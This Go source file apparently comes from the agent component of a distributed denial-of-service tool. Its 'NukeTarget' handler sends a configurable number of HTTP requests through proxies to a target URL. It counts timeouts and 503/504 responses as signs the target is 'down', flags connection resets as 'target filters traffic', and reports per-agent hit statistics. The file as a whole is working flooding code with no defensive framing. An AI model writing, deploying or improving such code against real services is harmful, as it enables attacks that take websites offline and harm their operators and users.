package handler

import (
	"bytes"
	"context"
	"encoding/json"
	"io"
	"net/http"
	"os"
	"syscall"

	"github.com/andriiyaremenko/mg/client"
	"github.com/andriiyaremenko/mg/dto"
	"github.com/andriiyaremenko/tinycqs/command"
	"github.com/pkg/errors"
)

func NukeTarget(amountRequests int64, agentUID string) command.Handler {
	return &command.BaseHandler{
		Type: "NUKE_TARGET",
		HandleFunc: func(ctx context.Context, w command.EventWriter, e command.Event) {
			defer w.Done()

			select {
			case <-ctx.Done():
				return
			default:
			}

			p := e.Payload()
			target := new(dto.Target)
			if err := json.Unmarshal(p, target); err != nil {
				w.Write(command.NewErrEvent(e, errors.Wrap(err, "bad target record")))
				return
			}

			hits := 0
			for i := amountRequests; i > 0; i-- {
				select {
				case <-ctx.Done():
					return
				default:
				}

				resp, err := sendRequest(target)

				if errors.Is(err, context.DeadlineExceeded) || os.IsTimeout(err) {
					hits++

					writeTargetIsDown(w, target, agentUID, p)
					collectStatistic(w, agentUID, target.ID, 0, 1)

					if hits >= 5 {
						return
					}

					continue
				}

				if errors.Is(err, io.EOF) || errors.Is(err, syscall.ECONNRESET) {
					w.Write(
						command.NewErrEvent(
							e,
							errors.Wrap(err, "attack failed, target filters traffic"),
						),
					)
					collectStatistic(w, agentUID, target.ID, 0, 1)

					return
				}

				if err != nil {
					w.Write(command.NewErrEvent(e, errors.Wrap(err, "request failed")))
					collectStatistic(w, agentUID, target.ID, 0, 1)

					continue
				}

				resp.Body.Close()

				if resp.StatusCode == http.StatusServiceUnavailable ||
					resp.StatusCode == http.StatusGatewayTimeout {
					hits++

					writeTargetIsDown(w, target, agentUID, p)
					collectStatistic(w, agentUID, target.ID, 0, 1)

					if hits >= 5 {
						return
					}

					continue
				}

				hits = 0
				if resp.StatusCode < 500 {
					w.Write(command.E{
						Type: "TARGET_ALIVE",
						P:    p,
					})

					collectStatistic(w, agentUID, target.ID, 1, 0)

					continue
				}

				targetErr := dto.TargetError{
					Target:  *target,
					ErrCode: resp.StatusCode,
				}

				b, err := json.Marshal(targetErr)
				if err != nil {
					w.Write(command.NewErrEvent(e, errors.Wrap(err, "bad target error record")))

					continue
				}

				w.Write(command.E{
					Type: "TARGET_ERROR",
					P:    b,
				})

				collectStatistic(w, agentUID, target.ID, 0, 1)
			}
		},
	}
}

func sendRequest(target *dto.Target) (*http.Response, error) {
	client, err := client.WithProxy(target.Proxy)
	if err != nil {
		return nil, errors.Wrap(err, "bad target proxy record")
	}

	var body io.Reader = nil

	if target.Data != nil {
		body = bytes.NewReader(target.Data)
	}

	req, err := http.NewRequest(target.Method, target.URL, body)
	if err != nil {
		return nil, err
	}

	for _, header := range target.Headers {
		req.Header.Add(header[0], header[1])
	}

	return client.Do(req)
}

func writeTargetIsDown(w command.EventWriter, target *dto.Target, agentUID string, p []byte) {
	w.Write(command.E{
		Type: "TARGET_DOWN",
		P:    p,
	})
}

func collectStatistic(w command.EventWriter, agentUID string, targetID int, s, e int64) {
	st, err := json.Marshal(dto.TargetStatistic{
		Statistic: dto.Statistic{
			AgentUID: agentUID,
			Success:  s,
			Error:    e,
		},
		TargetID: targetID,
	})

	if err == nil {
		w.Write(command.E{
			Type: "COLLECT_STATISTIC",
			P:    st,
		})
	}
}
